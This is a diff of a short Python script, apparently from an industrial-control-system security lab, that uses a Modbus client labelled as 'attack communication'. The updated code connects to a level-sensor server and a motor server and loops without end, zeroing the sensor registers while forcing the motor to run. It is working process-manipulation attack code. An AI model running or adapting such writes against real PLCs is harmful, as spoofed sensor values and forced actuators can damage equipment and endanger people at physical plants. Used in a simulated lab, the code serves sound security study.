@@ -7,28 +7,27 @@
 import modbus
 import logging
 
-# - Attack communication
+# - Comunicacion de ataques
 from modbus	import ClientModbus as Client
 from modbus	import ConnectionException 
 
-# - World environement
+# - World
 from world import *
 
-#########################################
-# Logging
-#########################################
 logging.basicConfig()
 log = logging.getLogger()
 log.setLevel(logging.INFO)
 
-#####################################
-# Stop all code
-#####################################
-client = Client(PLC_SERVER_IP, port=PLC_SERVER_PORT)
+client = Client(LEVEL_SERVER_IP, port=LEVEL_SERVER_PORT)
+client2 = Client(MOTOR_SERVER_IP, port=MOTOR_SERVER_PORT)
 try:
     client.connect()
+    client2.connect()
     while True:
-        rq = client.write(PLC_RW_ADDR, 0x2) 
+        rq = client.write(LEVEL_RO_ADDR, 0) 
+        rq = client.write(LEVEL_TAG_SENSOR, 0) 
+        rq = client.write(MOTOR_RW_ADDR, 1) 
+        rq = client.write(MOTOR_TAG_RUN, 1)
 except KeyboardInterrupt:
     client.close()
 except ConnectionException:
